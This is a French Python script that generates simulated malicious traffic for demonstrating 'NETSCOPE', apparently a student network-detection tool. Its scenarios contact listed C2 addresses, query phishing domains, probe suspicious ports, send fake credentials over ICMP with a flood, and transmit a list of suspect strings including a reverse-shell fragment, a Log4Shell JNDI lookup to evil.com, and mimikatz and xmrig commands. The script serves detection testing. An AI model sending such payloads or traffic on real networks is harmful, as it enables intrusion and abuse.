#!/usr/bin/env python3
"""
NETSCOPE - Script de démonstration pour PC cible
=================================================
Génère du trafic réseau détectable par NETSCOPE pour la présentation.
Chaque scénario déclenche un type d'anomalie différent.

Usage:
    python demo_scenario.py [--all] [--scenario N] [--delay SECONDS]

Auto-détecte la gateway réseau. Aucune config nécessaire.

Prérequis PC cible:
    pip install requests scapy
    (scapy optionnel — fallback sur socket/curl si absent)

⚠️  Usage éducatif uniquement — réseau isolé de démo.
"""

import argparse
import re
import socket
import subprocess
import sys
import time

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, send, sr1
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


# ============================================================
# Configuration
# ============================================================

GATEWAY_IP = None  # auto-détecté au lancement

# Données extraites des blacklists NETSCOPE
BLACKLISTED_IPS = [
    "159.100.14.254",   # Cobalt Strike C2
    "159.100.13.80",    # Cobalt Strike beacon
    "23.106.122.192",   # C2 connu
    "45.77.65.211",     # C2 connu
]

PHISHING_DOMAINS = [
    "paypa1.com",
    "paypa1-secure.com",
    "paypal-secure-verify.com",
    "paypal-login-2026.com",
]

MALWARE_DOMAINS = [
    "flash-player-update.com",
    "flash-player-update-now.com",
    "adobe-flash-update.com",
]

SUSPICIOUS_PORTS = [4444, 1337, 6666, 6667, 31337, 12345, 27374, 5555]

SUSPECT_TERMS = [
    "/bin/bash -i",
    "sh -i >& /dev/tcp/",
    "${jndi:ldap://evil.com/a}",
    "xmrig --donate-level",
    "mimikatz sekurlsa::logonpasswords",
]


# ============================================================
# Utilitaires
# ============================================================

def detect_gateway() -> str:
    """Auto-détecte la gateway par défaut du réseau."""
    try:
        if sys.platform == "win32":
            out = subprocess.check_output(
                ["powershell", "-Command",
                 "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -First 1).NextHop"],
                text=True, timeout=5
            ).strip()
            if re.match(r"\d+\.\d+\.\d+\.\d+", out):
                return out
        else:
            out = subprocess.check_output(
                ["ip", "route", "show", "default"], text=True, timeout=5
            )
            match = re.search(r"via (\d+\.\d+\.\d+\.\d+)", out)
            if match:
                return match.group(1)
    except Exception:
        pass
    return "192.168.1.1"


def banner(title: str):
    width = 60
    print(f"\n{'=' * width}")
    print(f"  🎯 {title}")
    print(f"{'=' * width}")


def step(msg: str):
    print(f"  ▸ {msg}")


def pause(seconds: float, label: str = ""):
    if label:
        print(f"  ⏳ Pause {seconds}s — {label}")
    time.sleep(seconds)




# ============================================================
# Scénario 1 — Détection blacklist IP (C2)
# ============================================================

def scenario_1_blacklist_ip():
    banner("SCÉNARIO 1 — Connexion vers IPs C2 blacklistées")
    print("  Déclenche: anomalie IP blacklistée (score base 85 + bonus)")
    print()

    for ip in BLACKLISTED_IPS:
        step(f"Tentative connexion TCP → {ip}:443")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect_ex((ip, 443))
            s.close()
        except Exception:
            pass
        pause(0.5)

    step("Connexions C2 simulées — paquets visibles par NETSCOPE")


# ============================================================
# Scénario 2 — Résolution DNS domaines phishing/malware
# ============================================================

def scenario_2_phishing_domains():
    banner("SCÉNARIO 2 — Requêtes DNS vers domaines phishing/malware")
    print("  Déclenche: anomalie domaine blacklisté (score base 80)")
    print()

    all_domains = PHISHING_DOMAINS + MALWARE_DOMAINS

    for domain in all_domains:
        step(f"nslookup {domain}")
        try:
            socket.getaddrinfo(domain, 80, socket.AF_INET, socket.SOCK_STREAM)
        except socket.gaierror:
            pass
        pause(0.3)

    if HAS_SCAPY:
        step("Envoi requêtes DNS via Scapy pour visibilité maximale")
        for domain in all_domains[:3]:
            try:
                pkt = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
                sr1(pkt, timeout=2, verbose=0)
            except Exception:
                pass

    step("Requêtes DNS phishing/malware envoyées")


# ============================================================
# Scénario 3 — Trafic sur ports suspects
# ============================================================

def scenario_3_suspicious_ports():
    banner("SCÉNARIO 3 — Connexions sur ports suspects")
    print("  Déclenche: bonus port suspect (+15 au score anomalie)")
    print()

    for port in SUSPICIOUS_PORTS:
        step(f"Connexion TCP → {GATEWAY_IP}:{port}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect_ex((GATEWAY_IP, port))
            s.close()
        except Exception:
            pass
        pause(0.3)

    if HAS_SCAPY:
        step("Scan SYN Scapy sur ports suspects")
        for port in SUSPICIOUS_PORTS[:4]:
            try:
                pkt = IP(dst=GATEWAY_IP) / TCP(dport=port, flags="S")
                send(pkt, verbose=0)
            except Exception:
                pass

    step("Trafic ports suspects généré")


# ============================================================
# Scénario 4 — Flood ICMP (top talker + volume)
# ============================================================

EXFIL_DATA = [
    "user:admin password:S3cur3P@ss!",
    "credit_card:4532-1234-5678-9012 exp:12/27 cvv:321",
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ== admin@server",
    "DB_HOST=prod-db.internal DB_PASS=r00tP@ssw0rd",
    "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "BEGIN RSA PRIVATE KEY MIIEowIBAAKCAQEA7...fake...key",
    '{"api_token":"ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx","repo":"internal/secrets"}',
    "employee_ssn:123-45-6789 name:John.Doe salary:95000",
]


def scenario_4_icmp_exfil():
    banner("SCÉNARIO 4 — Exfiltration de données via ICMP")
    print("  Déclenche: top talker + volume anormal + données sensibles dans payload ICMP")
    print()

    if HAS_SCAPY:
        step("Exfiltration via payload ICMP (Scapy)")
        for i, data in enumerate(EXFIL_DATA):
            chunk = data.encode()
            step(f"Paquet {i+1}/{len(EXFIL_DATA)}: {data[:50]}...")
            try:
                pkt = IP(dst=GATEWAY_IP) / ICMP(type=8, id=0xDEAD, seq=i) / chunk
                send(pkt, verbose=0)
            except Exception:
                pass
            pause(0.3)

        step("Flood ICMP pour couvrir l'exfiltration (100 paquets)")
        for i in range(100):
            try:
                pkt = IP(dst=GATEWAY_IP) / ICMP(type=8) / (b"X" * 1000)
                send(pkt, verbose=0)
            except Exception:
                pass

    else:
        step("Scapy absent — fallback ping classique (sans payload custom)")
        count = 200
        if sys.platform == "win32":
            cmd = ["ping", "-n", str(count), "-l", "1000", "-w", "100", GATEWAY_IP]
        else:
            cmd = ["ping", "-c", str(count), "-s", "1000", "-i", "0.01", GATEWAY_IP]
        try:
            subprocess.run(cmd, timeout=30, capture_output=True)
        except subprocess.TimeoutExpired:
            pass

    step("Exfiltration ICMP terminée — volume + payload suspect visibles")


# ============================================================
# Scénario 5 — Payload suspect dans trafic (terms detection)
# ============================================================

def scenario_5_suspect_terms():
    banner("SCÉNARIO 5 — Payload avec termes suspects")
    print("  Déclenche: anomalie terme suspect (score base 65)")
    print("  ⚠️  Nécessite Scapy + capture niveau 2+ sur NETSCOPE")
    print()

    if not HAS_SCAPY:
        step("Scapy non disponible — fallback HTTP")
        if HAS_REQUESTS:
            for term in SUSPECT_TERMS[:3]:
                step(f"Envoi payload HTTP contenant: {term[:40]}...")
                try:
                    requests.post(
                        f"http://{GATEWAY_IP}/",
                        data=term,
                        timeout=2
                    )
                except Exception:
                    pass
        else:
            step("Ni Scapy ni requests disponible — scénario ignoré")
        return

    for term in SUSPECT_TERMS:
        step(f"Envoi UDP payload: {term[:40]}...")
        try:
            pkt = IP(dst=GATEWAY_IP) / UDP(dport=9999) / term.encode()
            send(pkt, verbose=0)
        except Exception:
            pass
        pause(0.2)

    step("Payloads suspects envoyés")


# ============================================================
# Scénario 6 — Attaque combinée (score maximum)
# ============================================================

def scenario_6_combined():
    banner("SCÉNARIO 6 — Attaque combinée (multiplicateur 1.2x)")
    print("  Déclenche: IP blacklistée + port suspect + volume = score maximum")
    print()

    if HAS_SCAPY:
        step("Envoi rafale combinée via Scapy")
        for i in range(50):
            try:
                pkt = IP(dst=BLACKLISTED_IPS[0]) / TCP(dport=4444, flags="S")
                send(pkt, verbose=0)
            except Exception:
                pass

        for i in range(50):
            try:
                pkt = IP(dst=BLACKLISTED_IPS[1]) / TCP(dport=31337, flags="S")
                send(pkt, verbose=0)
            except Exception:
                pass

        step("100 paquets combinés envoyés (C2 + ports suspects)")
    else:
        step("Fallback socket — connexions multiples")
        for _ in range(30):
            for ip in BLACKLISTED_IPS[:2]:
                for port in [4444, 31337, 6666]:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        s.connect_ex((ip, port))
                        s.close()
                    except Exception:
                        pass

    step("Attaque combinée terminée — score santé devrait être critique")


# ============================================================
# Orchestration
# ============================================================

SCENARIOS = {
    1: ("Blacklist IP (C2)", scenario_1_blacklist_ip),
    2: ("Domaines phishing/malware", scenario_2_phishing_domains),
    3: ("Ports suspects", scenario_3_suspicious_ports),
    4: ("Exfiltration ICMP (Top Talker)", scenario_4_icmp_exfil),
    5: ("Payloads termes suspects", scenario_5_suspect_terms),
    6: ("Attaque combinée (max score)", scenario_6_combined),
}


def run_demo(args):
    print("""
    ╔══════════════════════════════════════════════════════╗
    ║         NETSCOPE — Script Démonstration              ║
    ║         Présentation YDAYS — 13 mai 2026             ║
    ╠══════════════════════════════════════════════════════╣
    ║  ⚠️  Usage éducatif — réseau isolé uniquement         ║
    ╚══════════════════════════════════════════════════════╝
    """)

    global GATEWAY_IP
    GATEWAY_IP = args.gateway or detect_gateway()

    step(f"Gateway: {GATEWAY_IP}")
    step(f"Scapy: {'✅' if HAS_SCAPY else '❌ (fallback socket)'}")
    print()

    if args.scenario:
        nums = args.scenario
    elif args.all:
        nums = list(SCENARIOS.keys())
    else:
        print("\n  Scénarios disponibles:")
        for n, (label, _) in SCENARIOS.items():
            print(f"    {n}. {label}")
        print(f"    0. Tous les scénarios")
        print()
        choice = input("  Choix (numéro ou 0 pour tous): ").strip()
        if choice == "0":
            nums = list(SCENARIOS.keys())
        else:
            nums = [int(c) for c in choice.split(",") if c.strip().isdigit()]

    for n in nums:
        if n in SCENARIOS:
            label, func = SCENARIOS[n]
            func()
            if args.delay > 0 and n != nums[-1]:
                pause(args.delay, "Pause entre scénarios (pour explication audience)")
        else:
            print(f"  ⚠️  Scénario {n} inconnu")

    banner("DÉMONSTRATION TERMINÉE")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="NETSCOPE — Script de démonstration pour PC cible"
    )
    parser.add_argument(
        "--gateway", default=None,
        help="IP cible (défaut: auto-détection gateway réseau)"
    )
    parser.add_argument(
        "--scenario", type=int, nargs="+",
        help="Numéro(s) de scénario à exécuter (1-6)"
    )
    parser.add_argument(
        "--all", action="store_true",
        help="Exécuter tous les scénarios"
    )
    parser.add_argument(
        "--delay", type=float, default=5.0,
        help="Pause entre scénarios en secondes (défaut: 5)"
    )
    args = parser.parse_args()
    run_demo(args)


if __name__ == "__main__":
    main()
